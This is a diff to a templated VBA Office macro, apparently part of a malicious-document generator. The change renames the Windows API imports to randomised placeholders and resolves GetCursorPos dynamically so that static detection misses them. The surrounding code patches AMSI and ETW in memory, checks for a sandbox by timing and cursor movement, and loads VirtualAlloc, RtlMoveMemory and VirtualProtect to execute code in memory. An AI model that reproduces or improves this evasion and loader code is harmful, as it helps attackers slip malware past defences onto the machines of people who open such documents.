@@ -5,10 +5,9 @@ Option Explicit
     Private Declare PtrSafe Function {{ v.fn_callwp }} Lib "user32" Alias "CallWindowProcA" _
         (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
          ByVal Msg As LongPtr, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
-    Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As LongPtr
-    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" _
+    Private Declare PtrSafe Function {{ v.fn_loadlib }} Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
+    Private Declare PtrSafe Function {{ v.fn_getprocaddr }} Lib "kernel32" Alias "GetProcAddress" _
         (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
-    Private Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As Any) As Long
 #End If
 
 Private {{ v.fn_valloc }} As LongPtr
@@ -27,9 +26,9 @@ Private Sub {{ v.fn_amsi_patch }}()
     On Error Resume Next
     Dim amsiLib As String: amsiLib = {{ v.vba_amsi_dll }}
     Dim scanName As String: scanName = {{ v.vba_amsi_scan_buf }}
-    Dim amsiBase As LongPtr: amsiBase = LoadLibraryA(amsiLib)
+    Dim amsiBase As LongPtr: amsiBase = {{ v.fn_loadlib }}(amsiLib)
     If amsiBase = 0 Then Exit Sub
-    Dim scanAddr As LongPtr: scanAddr = GetProcAddress(amsiBase, scanName)
+    Dim scanAddr As LongPtr: scanAddr = {{ v.fn_getprocaddr }}(amsiBase, scanName)
     If scanAddr = 0 Then Exit Sub
     Dim oldP As Long
     {{ v.fn_callwp }} {{ v.fn_vprotect }}, scanAddr, 6, &H40, VarPtr(oldP)
@@ -43,9 +42,9 @@ Private Sub {{ v.fn_etw_patch }}()
     On Error Resume Next
     Dim ntdllName As String: ntdllName = {{ v.vba_ntdll_dll }}
     Dim etwName As String: etwName = {{ v.vba_etw_event_write }}
-    Dim ntdllBase As LongPtr: ntdllBase = LoadLibraryA(ntdllName)
+    Dim ntdllBase As LongPtr: ntdllBase = {{ v.fn_loadlib }}(ntdllName)
     If ntdllBase = 0 Then Exit Sub
-    Dim etwAddr As LongPtr: etwAddr = GetProcAddress(ntdllBase, etwName)
+    Dim etwAddr As LongPtr: etwAddr = {{ v.fn_getprocaddr }}(ntdllBase, etwName)
     If etwAddr = 0 Then Exit Sub
     Dim oldP As Long
     {{ v.fn_callwp }} {{ v.fn_vprotect }}, etwAddr, 4, &H40, VarPtr(oldP)
@@ -170,18 +169,21 @@ End Function
 
 Private Sub {{ v.fn_exec }}()
     If {{ v.fn_sandbox }}() Then Exit Sub
-    Dim k32 As LongPtr: k32 = LoadLibraryA({{ v.vba_kernel32 }})
-    {{ v.fn_valloc }}  = GetProcAddress(k32, {{ v.vba_virtual_alloc }})
-    {{ v.fn_movemem }} = GetProcAddress(k32, {{ v.vba_rtl_move_mem }})
-    {{ v.fn_vprotect }} = GetProcAddress(k32, {{ v.vba_virtual_protect }})
+    Dim k32 As LongPtr: k32 = {{ v.fn_loadlib }}({{ v.vba_kernel32 }})
+    {{ v.fn_valloc }}  = {{ v.fn_getprocaddr }}(k32, {{ v.vba_virtual_alloc }})
+    {{ v.fn_movemem }} = {{ v.fn_getprocaddr }}(k32, {{ v.vba_rtl_move_mem }})
+    {{ v.fn_vprotect }} = {{ v.fn_getprocaddr }}(k32, {{ v.vba_virtual_protect }})
     If {{ v.fn_valloc }} = 0 Or {{ v.fn_movemem }} = 0 Or {{ v.fn_vprotect }} = 0 Then Exit Sub
+    Dim _u32 As LongPtr: _u32 = {{ v.fn_loadlib }}({{ v.vba_user32_dll }})
+    Dim _fnGcp As LongPtr: _fnGcp = {{ v.fn_getprocaddr }}(_u32, {{ v.vba_get_cursor_pos }})
+    If _fnGcp = 0 Then Exit Sub
     ' Record cursor before delay; check movement after — no extra wait
     Dim _pt1(1) As Long, _pt2(1) As Long
-    GetCursorPos _pt1(0)
+    {{ v.fn_callwp }} _fnGcp, VarPtr(_pt1(0)), 0, 0, 0
     ' Execution delay to defeat sandbox timing
     Dim tStart As Date: tStart = Now
     Do While DateDiff("s", tStart, Now) < 2: DoEvents: Loop
-    GetCursorPos _pt2(0)
+    {{ v.fn_callwp }} _fnGcp, VarPtr(_pt2(0)), 0, 0, 0
     If _pt1(0) = _pt2(0) And _pt1(1) = _pt2(1) Then Exit Sub
     Call {{ v.fn_amsi_patch }}
     Call {{ v.fn_etw_patch }}
